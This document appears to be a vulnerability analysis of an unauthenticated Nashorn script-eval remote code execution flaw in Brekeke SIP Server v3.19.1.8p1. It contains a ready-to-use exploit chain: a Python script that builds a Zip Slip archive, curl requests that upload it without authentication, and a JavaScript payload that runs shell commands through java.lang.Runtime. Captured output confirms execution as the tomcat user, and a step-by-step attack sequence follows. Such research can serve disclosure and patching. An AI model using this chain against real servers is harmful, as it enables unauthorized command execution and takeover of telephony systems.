# Brekeke SIP Server Unauthenticated Nashorn JS Engine RCE - Technical Analysis

## Overview

Brekeke SIP Server v3.19.1.8p1 exposes the `ProvisioningTest` bean through the unauthenticated fail-open authentication framework. Its `exec()` method takes a user-controlled `script` parameter and passes it directly to a Nashorn `ScriptEngine.eval()` call with no filtering and no sandbox. Because Nashorn's default configuration permits referencing Java types (`java.lang.Runtime`, `java.lang.ProcessBuilder`), an attacker submits JavaScript that calls `Runtime.getRuntime().exec(...)` to execute arbitrary system commands. The command output is echoed back through the `start()` function that `ProvisioningTest` invokes after eval. The result is unauthenticated remote code execution as the `tomcat` user. The only prerequisite is that the `etc/pv/temp/` directory exists; in the default deployment it does not, but it can be created unauthenticated via the Zip Slip primitive, after which a single request achieves RCE.

## Product Background

| Item | Value |
|------|-------|
| Product | Brekeke SIP Server (SIP Proxy / SIP Registrar) |
| Vendor | Brekeke Software, Inc. (US California / Japan Okinawa R&D) |
| Version | v3.19.1.8p1 (Evaluation Edition, built 2026-06-24) |
| Architecture | Java Servlet (sip.war 20.5 MB) on Tomcat 9.0.87 + Java 17 |
| Self-developed components | ondosip.jar (SIP stack) / ondooss.jar (business + Command bean) / ondoutil.jar (GateServlet/Bean/auth framework) |

## Authentication Boundary

This vulnerability builds on the authentication fail-open primitive. `ProvisioningTest` is one of the 23 beans that never call `setCheckScope(...)`, so `ScopeBean.checkScope()` admits it unconditionally. An anonymous caller reaches `ProvisioningTest.exec()` directly:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  "http://127.0.0.1:8080/sip/gate?bean=sipadmin.web.ProvisioningTest"
# -> 200 (unauthenticated reachable)
```

There is no secondary `isAdmin()` or `checkScope()` gate inside `exec()` — the entire bean has already bypassed authentication.

## Sink Identification

### ProvisioningTest.exec() (ondooss.jar)

```java
// com.brekeke.sipadmin.web.ProvisioningTest extends Provisioning
import com.brekeke.util.script.ScriptUtils;
import java.io.FileWriter;
import javax.script.Invocable;
import javax.script.ScriptEngine;
import javax.script.ScriptException;

public class ProvisioningTest extends Provisioning {
    public String script = "";

    @Override
    protected boolean exec() throws IOException {
        String string = this.getParam("operation", "");
        this.sipuser = this.getParam("sipuser", "");
        this.script = this.getParam("script", "");          // <- user-controlled JS
        this.result = this.getParam("result", "");
        String string2 = ProvisioningTest.getPathRoot() + "/temp/test";

        if (string.equals("test")) {
            this.message = "script test";
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(string2)));
            bufferedWriter.write(this.script);              // write to temp/test first
            bufferedWriter.close();
            try {
                ScriptEngine scriptEngine = ScriptUtils.getScriptEngine();   // <- Nashorn
                ArrayList<String> arrayList = new ArrayList<String>();
                arrayList.add("-");
                arrayList.add("0001");
                scriptEngine.eval(this.script);             // <- eval user-controlled JS, no filter
                Invocable invocable = (Invocable)((Object)scriptEngine);
                this.result = (String)invocable.invokeFunction("start",
                        arrayList.toArray(...), this.getRequest(), this.getResponse());
            }
            catch (ScriptException scriptException) {
                Dump.out.error("", (Throwable)scriptException);
            }
            catch (NoSuchMethodException noSuchMethodException) {
                Dump.out.error("", (Throwable)noSuchMethodException);
            }
        }
        this.script = new String(Files.readAllBytes(Paths.get(string2, new String[0])));
        return true;
    }
}
```

### Key observations

1. `this.script = this.getParam("script", "")` — the `script` parameter is fully user-controlled.
2. `scriptEngine.eval(this.script)` — the Nashorn JS engine evaluates it directly, with no filtering and no sandbox.
3. Nashorn's default configuration permits referencing Java types (`java.lang.Runtime`, `java.lang.ProcessBuilder`), so arbitrary system commands can be executed.
4. `exec()` has no authentication gate — the bean already bypassed auth via the fail-open primitive.

### ScriptUtils.getScriptEngine()

`ScriptUtils` (`ondoutil.jar`) returns a Nashorn `ScriptEngine` (the product bundles `nashorn-core-15.4`). Nashorn's default `INSTANCE` permits Java type references and runs with no SecurityManager sandbox.

## Precondition: The temp Directory

Before `eval`, `exec()` writes the script to `getPathRoot() + "/temp/test"` using `new FileWriter(new File(...))`. `FileWriter` does not create parent directories.

```java
// com.brekeke.sipadmin.web.Provisioning
public static String getPathRoot() {
    return SIPSV_SETTING_ROOT + "/etc/pv";   // = <war>/WEB-INF/work/sv/etc/pv
}
```

The default deployment's `etc/pv/` contains only `models/scripts/logs/command/config.properties` — there is no `temp/`. If `temp/` does not exist, `FileWriter` throws `FileNotFoundException` and the request returns 500.

### Unlocking the temp directory

The Zip Slip primitive (a zip entry named `../../temp/x`) can create the `etc/pv/temp/` directory unauthenticated, after which this Nashorn RCE works. Alternatively, the Zip Slip webshell path achieves RCE directly without depending on `temp/`.

## Dynamic Verification

### Full chain: Zip Slip creates temp, then Nashorn RCE

```bash
# Step 1: Zip Slip creates the etc/pv/temp/ directory
python3 -c "
import zipfile
with zipfile.ZipFile('/tmp/t.zip','w') as z:
    z.writestr('../../temp/unlock.txt','x')   # 2 layers ../ to etc/pv/temp/
"
curl -s -o /dev/null -F "operation=import" -F "model=t" -F "overwrite=true" \
  -F "modelfile=@/tmp/t.zip;filename=t.zip" \
  "http://127.0.0.1:8080/sip/gate?bean=sipadmin.web.ProvisioningModelImport"

# Step 2: Nashorn RCE
curl -s "http://127.0.0.1:8080/sip/gate?bean=sipadmin.web.ProvisioningTest" \
  --data-urlencode "operation=test" \
  --data-urlencode 'script=var r=java.lang.Runtime.getRuntime().exec(["sh","-c","id"]); var is=r.getInputStream(); var sc=new java.util.Scanner(is).useDelimiter("\\A"); var out=sc.hasNext()?sc.next():""; function start(a,req,res){return out;}'
```

### Result

```
uid=53(tomcat) gid=53(tomcat) groups=53(tomcat)
```

The `id` command executes as the `tomcat` user. Nashorn reaches `java.lang.Runtime.getRuntime().exec()` and runs arbitrary system commands.

### Single-request path (when temp already exists)

If `etc/pv/temp/` already exists (a non-default configuration), a single request to `ProvisioningTest` achieves RCE with no Zip Slip prerequisite.

## Nashorn Payload Construction

Nashorn JS reaches the Java runtime through `java.lang.*`. An echo payload:

```javascript
var r = java.lang.Runtime.getRuntime().exec(["sh","-c","id"]);
var is = r.getInputStream();
var sc = new java.util.Scanner(is).useDelimiter("\\A");
var out = sc.hasNext() ? sc.next() : "";
function start(a, req, res) { return out; }   // ProvisioningTest.invokeFunction("start",...)
```

After eval, `ProvisioningTest` calls `invocable.invokeFunction("start", ...)`, and the return value is echoed as `this.result`. The payload must therefore define a `start` function that returns the command output.

## Core Code Index

| File | Key code | Role |
|------|----------|------|
| `ondooss/.../ProvisioningTest.java:36` | `this.script = this.getParam("script","")` | user-controlled JS |
| `ondooss/.../ProvisioningTest.java:45` | `scriptEngine.eval(this.script)` | Nashorn eval sink |
| `ondooss/.../Provisioning.java` | `getPathRoot() = SIPSV_SETTING_ROOT+"/etc/pv"` | extraction root |
| `ondoutil/.../ScriptUtils.java` | `getScriptEngine()` returns Nashorn | JS engine |

## Complete Attack Sequence

1. **Unlock the temp directory**: use the Zip Slip primitive to create `etc/pv/temp/` unauthenticated
2. **Reach the eval sink**: POST to `ProvisioningTest` with `operation=test` and the malicious `script` parameter (unauthenticated via fail-open)
3. **Execute the command**: Nashorn evaluates the JS, which calls `java.lang.Runtime.getRuntime().exec(...)` to run the command as `tomcat`
4. **Retrieve output**: the `start()` function returns the command output, echoed in the HTTP response